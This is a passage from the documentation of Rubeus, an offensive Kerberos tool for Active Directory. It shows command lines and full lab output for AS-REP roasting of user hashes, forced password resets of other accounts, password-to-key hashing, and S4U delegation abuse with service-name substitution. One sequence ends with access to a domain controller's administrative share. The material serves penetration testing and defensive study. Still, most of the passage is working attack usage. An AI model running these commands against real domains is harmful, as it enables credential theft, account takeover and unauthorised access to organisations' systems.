requested for the user, and a component of the structure can be cracked offline a la kerberoasting. For more technical information, [see this post](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/).\r\n\r\nJust as with the [kerberoast](#kerberoast) command, if no other arguments are supplied, all user accounts not requiring with Kerberos preauth not required are roasted. The `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.\r\n\r\nThe `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.\r\n\r\nAlso, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with `/creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD`.\r\n\r\nThe output `/format:X` defaults to John the Ripper ([Jumbo version](https://github.com/magnumripper/JohnTheRipper)). `/format:hashcat` is also an option for the new hashcat mode 18200.\r\n\r\nIf the `/ldaps` flag is used, any LDAP queries will go over TLS (port 636).\r\n\r\nAS-REP roasting all users in the current domain:\r\n\r\n    C:\\Rubeus>Rubeus.exe asreproast\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n    [*] Action: AS-REP roasting\r\n\r\n    [*] Target Domain          : testlab.local\r\n\r\n    [*] SamAccountName         : dfm.a\r\n    [*] DistinguishedName      : CN=dfm.a,CN=Users,DC=testlab,DC=local\r\n    [*] Using domain controller: testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\\dfm.a'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 163 bytes\r\n    [*] Received 1537 bytes\r\n    [+] AS-REQ w/o preauth successful!\r\n    [*] AS-REP hash:\r\n\r\n        $krb5asrep$dfm.a@testlab.local:D4A4BC281B200EE35CBF4A4537792D07$D655...(snip)...\r\n\r\n    [*] SamAccountName         : TestOU3user\r\n    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local\r\n    [*] Using domain controller: testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\\TestOU3user'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 169 bytes\r\n    [*] Received 1437 bytes\r\n    [+] AS-REQ w/o preauth successful!\r\n    [*] AS-REP hash:\r\n\r\n        $krb5asrep$TestOU3user@testlab.local:DD6DF16B7E65223679CD703837C94FB...(snip)..\r\n\r\n    [*] SamAccountName         : harmj0y2\r\n    [*] DistinguishedName      : CN=harmj0y2,CN=Users,DC=testlab,DC=local\r\n    [*] Using domain controller: testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\\harmj0y2'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 166 bytes\r\n    [*] Received 1407 bytes\r\n    [+] AS-REQ w/o preauth successful!\r\n    [*] AS-REP hash:\r\n\r\n        $krb5asrep$harmj0y2@testlab.local:7D2E379A076BB804AF275ED51B86BF85$8...(snip)..\r\n\r\n\r\nAS-REP roasting all users in a specific OU, saving the hashes to an output file in Hashcat format:\r\n    \r\n    C:\\Rubeus>Rubeus.exe asreproast /ou:OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local /format:hashcat /outfile:C:\\Temp\\hashes.txt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n    [*] Action: AS-REP roasting\r\n\r\n    [*] Target OU              : OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local\r\n    [*] Target Domain          : testlab.local\r\n\r\n    [*] SamAccountName         : TestOU3user\r\n    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local\r\n    [*] Using domain controller: testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\\TestOU3user'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 169 bytes\r\n    [*] Received 1437 bytes\r\n    [+] AS-REQ w/o preauth successful!\r\n    [*] Hash written to C:\\Temp\\hashes.txt\r\n\r\n    [*] Roasted hashes written to : C:\\Temp\\hashes.txt\r\n\r\n\r\nAS-REP roasting a specific user:\r\n\r\n    C:\\Rubeus>Rubeus.exe asreproast /user:TestOU3user\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n    [*] Action: AS-REP roasting\r\n\r\n    [*] Target User            : TestOU3user\r\n    [*] Target Domain          : testlab.local\r\n\r\n    [*] SamAccountName         : TestOU3user\r\n    [*] DistinguishedName      : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local\r\n    [*] Using domain controller: testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/o preauth) for: 'testlab.local\\TestOU3user'\r\n    [*] Connecting to 192.168.52.100:88\r\n    [*] Sent 169 bytes\r\n    [*] Received 1437 bytes\r\n    [+] AS-REQ w/o preauth successful!\r\n    [*] AS-REP hash:\r\n\r\n        $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...\r\n\r\n\r\nAS-REP roasting all users in a foreign _trusting_ domain:\r\n\r\n    C:\\Rubeus>Rubeus.exe asreproast /domain:dev.testlab.local\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n    [*] Action: AS-REP roasting\r\n\r\n    [*] Target Domain          : dev.testlab.local\r\n\r\n    [*] SamAccountName         : devuser3\r\n    [*] DistinguishedName      : CN=devuser3,CN=Users,DC=dev,DC=testlab,DC=local\r\n    [*] Using domain controller: dev.testlab.local (192.168.52.105)\r\n    [*] Building AS-REQ (w/o preauth) for: 'dev.testlab.local\\devuser3'\r\n    [*] Connecting to 192.168.52.105:88\r\n    [*] Sent 175 bytes\r\n    [*] Received 1448 bytes\r\n    [+] AS-REQ w/o preauth successful!\r\n    [*] AS-REP hash:\r\n\r\n        $krb5asrep$devuser3@dev.testlab.local:650B881E44B92FB6A378DD21E8B020...(snip)...\r\n\r\n\r\nAS-REP roasting users in a foreign non-trusting domain using alternate credentials:\r\n\r\n    C:\\Rubeus>Rubeus.exe asreproast /domain:external.local /creduser:\"EXTERNAL.local\\administrator\" /credpassword:\"Password123!\"\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.4\r\n\r\n\r\n    [*] Action: AS-REP roasting\r\n\r\n    [*] Target Domain          : external.local\r\n\r\n    [*] Using alternate creds  : EXTERNAL.local\\administrator\r\n\r\n    [*] SamAccountName         : david\r\n    [*] DistinguishedName      : CN=david,CN=Users,DC=external,DC=local\r\n    [*] Using domain controller: external.local (192.168.52.95)\r\n    [*] Building AS-REQ (w/o preauth) for: 'external.local\\david'\r\n    [*] Connecting to 192.168.52.95:88\r\n    [*] Sent 165 bytes\r\n    [*] Received 1376 bytes\r\n    [+] AS-REQ w/o preauth successful!\r\n    [*] AS-REP hash:\r\n\r\n        $krb5asrep$david@external.local:9F5A33465C53056F17FEFDF09B7D36DD$47DBAC3...(snip)...\r\n\r\n\r\n## Miscellaneous\r\n\r\nBreakdown of the miscellaneous commands:\r\n\r\n| Command     | Description |\r\n| ----------- | ----------- |\r\n| [createnetonly](#createnetonly) | Create a process of logon type 9 |\r\n| [changepw](#changepw) | Perform the Aorato Kerberos password reset |\r\n| [hash](#hash) | Hash a plaintext password to Kerberos encryption keys |\r\n| [tgssub](#tgssub) | Substitute in alternate service names into a service ticket |\r\n| [currentluid](#currentluid) | Display the current user's LUID |\r\n| [logonsession](#logonsession) | Display logon session information |\r\n| [asrep2kirbi](#asrep2kirbi) | Convert an AS-REP and a client key to a Kirbi (KERB_CRED) |\r\n| [kirbi](#kirbi) | Manipulate Kirbi's (KERB_CRED) |\r\n\r\n\r\n### createnetonly\r\n\r\nThe **createnetonly** action will use the CreateProcessWithLogonW() API to create a new hidden (unless `/show` is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The process ID and LUID (logon session ID) are returned. This process can then be used to apply specific Kerberos tickets to with the [ptt /luid:0xA..](#ptt) parameter, assuming elevation. This prevents the erasure of existing TGTs for the current logon session.\r\n\r\nCreate a hidden upnpcont.exe process:\r\n\r\n    C:\\Rubeus>Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\upnpcont.exe\"\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: Create Process (/netonly)\r\n\r\n    [*] Showing process : False\r\n    [+] Process         : 'C:\\Windows\\System32\\upnpcont.exe' successfully created with LOGON_TYPE = 9\r\n    [+] ProcessID       : 9936\r\n    [+] LUID            : 0x4a0717f\r\n\r\n\r\nCreate a visible command prompt:\r\n\r\n    C:\\Rubeus>Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: Create Process (/netonly)\r\n\r\n    [*] Showing process : True\r\n    [+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\r\n    [+] ProcessID       : 5352\r\n    [+] LUID            : 0x4a091c0\r\n\r\nCreate a visible command prompt and import a ticket:\r\n\r\n    C:\\Rubeus>Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show /ticket:ticket.kirbi\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n\r\n    [*] Action: Create Process (/netonly)\r\n\r\n    [*] Showing process : True\r\n    [+] Process         : 'C:\\Windows\\System32\\cmd.exe' successfully created with LOGON_TYPE = 9\r\n    [+] ProcessID       : 5352\r\n    [+] LUID            : 0x4a091c0\r\n    [+] Ticket successfully imported!\r\n\r\n\r\n### changepw\r\n\r\nThe **changepw** action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified `/new:PASSWORD` value. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo's **misc::changepw** function.\r\n\r\nThe `/targetuser` argument can be used to change the password of other users, given the user whose TGT it is has enough privileges. The format required is **domain.com\\user**.\r\n\r\n**Note that either a users TGT or a service ticket for kadmin/changepw can be used to change the password**\r\n\r\nYou can retrieve a TGT blob using the [asktgt](#asktgt) command.\r\n\r\n    C:\\Rubeus>Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.3.3\r\n\r\n    [*] Action: Reset User Password (AoratoPw)\r\n\r\n    [*] Changing password for user: harmj0y@TESTLAB.LOCAL\r\n    [*] New password value: Password123!\r\n    [*] Building AP-REQ for the MS Kpassword request\r\n    [*] Building Authenticator with encryption key type: rc4_hmac\r\n    [*] base64(session subkey): nX2FOQ3RsGxoI8uqIg1zlg==\r\n    [*] Building the KRV-PRIV structure\r\n    [*] Connecting to 192.168.52.100:464\r\n    [*] Sent 1347 bytes\r\n    [*] Received 167 bytes\r\n    [+] Password change success!\r\n\r\nChanging the password of another user (**dev.ccob@dev.rubeus.ghostpack.local**) with a service ticket for **kadmin/changepw** retrieved using a referral TGT for **harmj0y@rubeus.ghostpack.local**:\r\n\r\n    C:\\Rubeus>Rubeus.exe changepw /targetuser:dev.rubeus.ghostpack.local\\dev.ccob /new:Pwn3dPassword123! /ticket:doIFYDCCBVygAw...(snip)...RtaW4bCGNoYW5nZXB3\r\n\r\n       ______        _\r\n      (_____ \\      | |\r\n       _____) )_   _| |__  _____ _   _  ___\r\n      |  __  /| | | |  _ \\| ___ | | | |/___)\r\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n      |_|   |_|____/|____/|_____)____/(___/\r\n\r\n      v2.0.0\r\n\r\n    [*] Action: Reset User Password (AoratoPw)\r\n\r\n    [*] Using domain controller: DevDC1.dev.rubeus.ghostpack.local (192.168.71.85)\r\n    [*] Resetting password for target user: dev.rubeus.ghostpack.local\\dev.ccob\r\n    [*] New password value: Pwn3dPassword123!\r\n    [*] Building AP-REQ for the MS Kpassword request\r\n    [*] Building Authenticator with encryption key type: aes256_cts_hmac_sha1\r\n    [*] base64(session subkey): wCAQoKiWlCjeEjfmqo+aA7ZlLSXYWhv+LzlXkGVJSXU=\r\n    [*] Building the KRV-PRIV structure\r\n    [+] Password change success!\r\n\r\n\r\n\r\n### hash\r\n\r\nThe **hash** action will take a `/password:X` and optional `/user:USER` and/or `/domain:DOMAIN`. It will generate the rc4_hmac (NTLM) representation of the password using @gentilkiwi's **kerberos:hash** (KERB_ECRYPT HashPassword) approach. If user and domain names are specified, the aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hash forms are generated. The user and domain names are used as salts for the AES and DES implementations.\r\n\r\nCalculating the rc4_hmac of a password:\r\n\r\n    C:\\Rubeus>Rubeus.exe hash /password:Password123!\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.0\r\n\r\n\r\n    [*] Action: Calculate Password Hashes\r\n\r\n    [*] Input password             : Password123!\r\n    [*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE\r\n\r\n    [!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!\r\n\r\nCalculating all hash formats:\r\n\r\n    C:\\Rubeus>Rubeus.exe hash /password:Password123! /user:harmj0y /domain:testlab.local\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.0\r\n\r\n\r\n    [*] Action: Calculate Password Hashes\r\n\r\n    [*] Input password             : Password123!\r\n    [*] Input username             : harmj0y\r\n    [*] Input domain               : testlab.local\r\n    [*] Salt                       : TESTLAB.LOCALharmj0y\r\n    [*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE\r\n    [*]       aes128_cts_hmac_sha1 : B0A79AB550536860123B427C14F2A531\r\n    [*]       aes256_cts_hmac_sha1 : F7FEBF9779401B653911A56A79FF9E3A58F7F8990FDB3D9CA0E89227ABF13287\r\n    [*]       des_cbc_md5          : 614589E66D6B3792\r\n\r\n\r\n### tgssub\r\n\r\nThe **tgssub** action will take a service ticket base64 blob/file specification and substitute an alternate service name into the ticket. This is useful for S4U abuse and other scenarios.\r\n\r\nThe `/altservice:X` argument is required and can either be a standalone sname (ldap, cifs, etc.) or a full service principal name (cifs/computer.domain.com). The former will create a new sname with only the service given, useful for cases where only the hostname is required. The latter is useful in some S4U2self abuse scenarios with resource-based constrained delegation. See Elad Shamir's [post on the topic](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) for more information.\r\n\r\nThe `/srealm:Y` argument is optional and can be used to change the service realm within the ticket.\r\n\r\nThe `/ptt` flag will \"pass-the-ticket\" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.\r\n\r\nExecuting the S4U2self/S4U2proxy proces to abuse traditional constrained delegation, and replacing the sname in the final ticket. This is so you don't have to execute the S4U process for a second time:\r\n\r\n    C:\\Rubeus>Rubeus.exe s4u /user:patsy /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /msdsspn:ldap/PRIMARY.testlab.local /impersonateuser:harmj0y /ptt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.2\r\n\r\n    [*] Action: Ask TGT\r\n\r\n    [*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\\patsy'\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIE+jCCBPagAwIBBaEDAgEWoo...(snip)...\r\n\r\n\r\n    [*] Action: S4U\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building S4U2self request for: 'patsy@TESTLAB.LOCAL'\r\n    [*] Sending S4U2self request\r\n    [+] S4U2self success!\r\n    [*] Got a TGS for 'harmj0y@TESTLAB.LOCAL' to 'patsy@TESTLAB.LOCAL'\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFXjCCBVqgAwIBBaEDAgEWoo...(snip)...\r\n\r\n    [*] Impersonating user 'harmj0y' to target SPN 'ldap/PRIMARY.testlab.local'\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building S4U2proxy request for service: 'ldap/PRIMARY.testlab.local'\r\n    [*] Sending S4U2proxy request\r\n    [+] S4U2proxy success!\r\n    [*] base64(ticket.kirbi) for SPN 'ldap/PRIMARY.testlab.local':\r\n\r\n        doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)...\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n    C:\\Rubeus>dir \\\\primary.testlab.local\\C$\r\n    Access is denied.\r\n\r\n    C:\\Rubeus>Rubeus.exe tgssub /ticket:doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)... /altservice:cifs /ptt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.2\r\n\r\n\r\n    [*] Action: Service Ticket sname Substitution\r\n\r\n    [*] Substituting in alternate service name: cifs\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)...\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n    UserName              :  harmj0y@TESTLAB.LOCAL\r\n    UserRealm             :  TESTLAB.LOCAL\r\n    ServiceName           :  cifs/PRIMARY.testlab.local\r\n    ServiceRealm          :  TESTLAB.LOCAL\r\n    StartTime             :  3/1/2019 12:51:06 PM\r\n    EndTime               :  3/1/2019 5:51:06 PM\r\n    RenewTill             :  3/8/2019 12:51:06 PM\r\n    Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable\r\n    KeyType               :  aes128_cts_hmac_sha1\r\n    Base64(key)           :  yxQVMhl0qn3P0wUUC4KnGQ==\r\n\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n    C:\\Rubeus>dir \\\\primary.testlab.local\\C$\r\n    Volume in drive \\\\primary.testlab.local\\C$ has no label.\r\n    Volume Serial Number is A48B-4D68\r\n\r\n    Directory of \\\\primary.testlab.local\\C$\r\n\r\n    07/05/2018  12:57 PM    <DIR>          dumps\r\n    03/05/2017  04:36 PM    <DIR>          inetpub\r\n    07/21/2018  07:41 PM                 9 out.txt\r\n    08/22/2013  07:52 AM    <DIR>          PerfLogs\r\n    04/15/2017  05:25 PM    <DIR>          profiles\r\n    08/28/2018  11:51 AM    <DIR>          Program Files\r\n    08/28/2018  11:51 AM    <DIR>          Program Files (x86)\r\n    10/09/2018  12:04 PM    <DIR>          Temp\r\n    08/23/2018  03:52 PM    <DIR>          Users\r\n    10/25/2018  01:15 PM    <DIR>          Windows\r\n                1 File(s)              9 bytes\r\n                9 Dir(s)  40,463,851,520 bytes free\r\n\r\n    C:\\Rubeus>Rubeus.exe klist\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.2\r\n\r\n\r\n\r\n    [*] Action: List Kerberos Tickets (Current User)\r\n\r\n    [*] Current LUID    : 0x6de14\r\n\r\n        [0] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 3/1/2019 12:51:06 PM ; 3/1/2019 5:51:06 PM ; 3/8/2019 12:51:06 PM\r\n        Server Name       : cifs/PRIMARY.testlab.local @ TESTLAB.LOCAL\r\n        Client Name       : harmj0y @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)\r\n\r\n        [1] - 0x12 - aes256_cts_hmac_sha1\r\n        Start/End/MaxRenew: 3/1/2019 12:51:06 PM ; 3/1/2019 5:51:06 PM ; 3/8/2019 12:51:06 PM\r\n        Server Name       : ldap/PRIMARY.testlab.local @ TESTLAB.LOCAL\r\n        Client Name       : harmj0y @ TESTLAB.LOCAL\r\n        Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)\r\n\r\n\r\nExecuting S4U2self to a machine using its machine account hash, substituting in the service names we want to abuse after:\r\n\r\n    C:\\Rubeus>Rubeus.exe s4u /user:primary$ /rc4:46b910dbe4514bd144b44cb554c256db /impersonateuser:harmj0y\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.2\r\n\r\n    [*] Action: Ask TGT\r\n\r\n    [*] Using rc4_hmac hash: 46b910dbe4514bd144b44cb554c256db\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building AS-REQ (w/ preauth) for: 'testlab.local\\primary$'\r\n    [+] TGT request successful!\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFIDCCBRygAwIBBaEDAgEWoo...(snip)...\r\n\r\n\r\n    [*] Action: S4U\r\n\r\n    [*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)\r\n    [*] Building S4U2self request for: 'primary$@TESTLAB.LOCAL'\r\n    [*] Sending S4U2self request\r\n    [+] S4U2self success!\r\n    [*] Got a TGS for 'harmj0y@TESTLAB.LOCAL' to 'primary$@TESTLAB.LOCAL'\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFgDCCBXygAwIBBaEDAgEWoo...(snip)...\r\n\r\n\r\n    C:\\Rubeus>Rubeus.exe describe /ticket:doIFgDCCBXygAwIBBaEDAgEWoo...(snip)...\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.2\r\n\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n    UserName              :  harmj0y@TESTLAB.LOCAL\r\n    UserRealm             :  TESTLAB.LOCAL\r\n    ServiceName           :  primary$\r\n    ServiceRealm          :  TESTLAB.LOCAL\r\n    StartTime             :  3/1/2019 12:43:56 PM\r\n    EndTime               :  3/1/2019 5:43:56 PM\r\n    RenewTill             :  3/8/2019 12:43:56 PM\r\n    Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable\r\n    KeyType               :  aes256_cts_hmac_sha1\r\n    Base64(key)           :  X6LnSCb4FUGo4Wec2FnfgQRz0h8zfgIRZxENxcIoIpU=\r\n\r\n    [!] Service ticket uses encryption key type 'aes256_cts_hmac_sha1', unable to extract hash and salt.\r\n\r\n\r\n    C:\\Rubeus>dir \\\\primary.testlab.local\\C$\r\n    Access is denied.\r\n\r\n    C:\\Rubeus>Rubeus.exe purge\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.2\r\n\r\n    Luid: 0x0\r\n\r\n    [*] Action: Purge Tickets\r\n    [+] Tickets successfully purged!\r\n\r\n    C:\\Rubeus>Rubeus.exe tgssub /ticket:doIFgDCCBXygAwIBBaEDAgEWoo...(snip)... /altservice:cifs/primary.testlab.local /ptt\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.4.2\r\n\r\n\r\n    [*] Action: Service Ticket sname Substitution\r\n\r\n    [*] Substituting in alternate service name: cifs/primary.testlab.local\r\n    [*] base64(ticket.kirbi):\r\n\r\n        doIFpjCCBaKgAwIBBaEDAgEWoo...(snip)...\r\n\r\n    [*] Action: Describe Ticket\r\n\r\n    UserName              :  harmj0y@TESTLAB.LOCAL\r\n    UserRealm             :  TESTLAB.LOCAL\r\n    ServiceName           :  cifs/primary.testlab.local\r\n    ServiceRealm          :  TESTLAB.LOCAL\r\n    StartTime             :  3/1/2019 12:43:56 PM\r\n    EndTime               :  3/1/2019 5:43:56 PM\r\n    RenewTill             :  3/8/2019 12:43:56 PM\r\n    Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable\r\n    KeyType               :  aes256_cts_hmac_sha1\r\n    Base64(key)           :  X6LnSCb4FUGo4Wec2FnfgQRz0h8zfgIRZxENxcIoIpU=\r\n\r\n\r\n    [*] Action: Import Ticket\r\n    [+] Ticket successfully imported!\r\n\r\n    C:\\Rubeus>dir \\\\primary.testlab.local\\C$\r\n    Volume in drive \\\\primary.testlab.local\\C$ has no label.\r\n    Volume Serial Number is A48B-4D68\r\n\r\n    Directory of \\\\primary.testlab.local\\C$\r\n\r\n    07/05/2018  12:57 PM    <DIR>          dumps\r\n    03/05/2017  04:36 PM    <DIR>          inetpub\r\n    08/22/2013  07:52 AM    <DIR>          PerfLogs\r\n    04/15/2017  05:25 PM    <DIR>          profiles\r\n    08/28/2018  11:51 AM    <DIR>          Program Files\r\n    08/28/2018  11:51 AM    <DIR>          Program Files (x86)\r\n    10/09/2018  12:04 PM    <DIR>          Temp\r\n    08/23/2018  03:52 PM    <DIR>          Users\r\n    10/25/2018  01:15 PM    <DIR>          Windows\r\n                1 File(s)              9 bytes\r\n                9 Dir(s)  40,462,831,616 bytes free\r\n\r\n\r\n### currentluid\r\n\r\nThe **currentluid** action will display the current user's logon ID (LUID).\r\n\r\n    C:\\Rubeus>Rubeus.exe currentluid\r\n\r\n     ______        _\r\n    (_____ \\      | |\r\n     _____) )_   _| |__  _____ _   _  ___\r\n    |  __  /| | | |  _ \\| ___ | | | |/___)\r\n    | |  \\ \\| |_| | |_) ) ____| |_| |___ |\r\n    |_|   |_|____/|____/|_____)____/(___/\r\n\r\n    v1.5.0\r\n\r\n\r\n    [*] Action: Display current LUID\r\n\r\n    [*] Current LogonID (LUID) : 0x121078 (1183864)\r\n\r\n\r\n### logonsession\r\n\r\nThe **logonsession** action will display information about the current context's logon session if not elevated, or all logonsessions if 